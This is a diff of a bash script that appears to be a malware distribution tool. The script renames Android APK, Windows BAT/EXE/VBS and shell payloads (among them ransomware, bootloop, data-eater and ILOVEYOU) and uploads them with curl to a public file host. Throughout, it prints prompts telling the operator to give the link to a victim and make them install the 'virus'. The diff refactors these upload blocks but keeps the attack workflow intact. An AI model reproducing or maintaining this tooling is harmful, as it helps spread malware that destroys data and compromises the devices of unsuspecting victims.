-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Grave.apk https://filepush.co/upload/Grave.apk
@@ -750,9 +699,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Malum.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Malum.apk https://filepush.co/upload/Malum.apk
@@ -768,9 +715,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Mobile_Legends_Adventure.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file Mobile_Legends_Adventure.apk https://filepush.co/upload/Mobile_Legends_Adventure.apk
@@ -786,9 +731,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv TakeBeer.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file TakeBeer.apk https://filepush.co/upload/TakeBeer.apk
@@ -804,9 +747,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv elite.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file elite.apk https://filepush.co/upload/elite.apk
@@ -822,9 +763,7 @@ if [ $zCh = 1 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv mobelejen.apk $newName.apk
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
-         curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
-         rm -f $newName.apk
+         apk
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
          curl --upload-file mobelejen.apk https://filepush.co/upload/mobelejen.apk
@@ -860,9 +799,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv RIP.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file RIP.bat https://filepush.co/upload/RIP.bat
@@ -879,7 +816,7 @@ elif [ $zCh = 2 ]; then
          read newName
          mv RansomwareFileDecryptor.exe $newName.exe
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.exe https://filepush.co/upload/$newName.bat
+         curl --upload-file $newName.exe https://filepush.co/upload/$newName.exe
          rm -f $newName.exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -896,9 +833,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv cmd.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file cmd.bat https://filepush.co/upload/cmd.bat
@@ -914,9 +849,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv koce.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file koce.bat https://filepush.co/upload/koce.bat
@@ -932,9 +865,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv kuis.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file kuis.bat https://filepush.co/upload/kuis.bat
@@ -950,9 +881,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv reg-eater.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file reg-eater.bat https://filepush.co/upload/reg-eater.bat
@@ -968,9 +897,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv sleely.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file sleepy.bat https://filepush.co/upload/sleepy.bat
@@ -986,9 +913,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ugly.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file ugly.bat https://filepush.co/upload/ugly.bat
@@ -1004,9 +929,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv PCT.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file PCT.bat https://filepush.co/upload/PCT.bat
@@ -1022,9 +945,7 @@ elif [ $zCh = 2 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv regeater.bat $newName.bat
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.bat https://filepush.co/upload/$newName.bat
-         rm -f $newName.bat
+         exe
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file regeater.bat https://filepush.co/upload/regeater.bat
@@ -1055,9 +976,7 @@ elif [ $zCh = 3 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv bootloop.sh $newName.sh
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
-         rm -f $newName.sh
+         sh
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file bootloop.sh https://filepush.co/upload/bootloop.sh
@@ -1073,9 +992,7 @@ elif [ $zCh = 3 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv data-eater.sh $newName.sh
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
-         rm -f $newName.sh
+         sh
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file data-eater.sh https://filepush.co/upload/data-eater.sh
@@ -1091,9 +1008,7 @@ elif [ $zCh = 3 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv freeze.sh $newName.sh
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
-         rm -f $newName.sh
+         sh
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file freeze.sh https://filepush.co/upload/freeze.sh
@@ -1109,9 +1024,7 @@ elif [ $zCh = 3 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv lil_virus.sh $newName.sh
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
-         rm -f $newName.sh
+         sh
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file lil_virus.sh https://filepush.co/upload/lil_virus.sh
@@ -1127,9 +1040,7 @@ elif [ $zCh = 3 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv trash.sh $newName.sh
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.sh https://filepush.co/upload/$newName.sh
-         rm -f $newName.sh
+         sh
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file trash.sh https://filepush.co/upload/trash.sh
@@ -1158,9 +1069,7 @@ elif [ $zCh = 4 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv alay.vbs $newName.vbs
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.vbs https://filepush.co/upload/$newName.vbs
-         rm -f $newName.vbs
+         etc
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file alay.vbs https://filepush.co/upload/alay.vbs
@@ -1176,9 +1085,7 @@ elif [ $zCh = 4 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv capslock.vbs $newName.vbs
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.vbs https://filepush.co/upload/$newName.vbs
-         rm -f $newName.vbs
+         etc
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file capslock.vbs https://filepush.co/upload/capslock.vbs
@@ -1194,9 +1101,7 @@ elif [ $zCh = 4 ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ILOVEYOU.vbs $newName.vbs
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
-         curl --upload-file $newName.vbs https://filepush.co/upload/$newName.vbs
-         rm -f $newName.vbs
+         etc
       elif [ "$change" = "n" ]; then
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
          curl --upload-file ILOVEYOU.vbs https://filepush.co/upload/ILOVEYOU.vbs
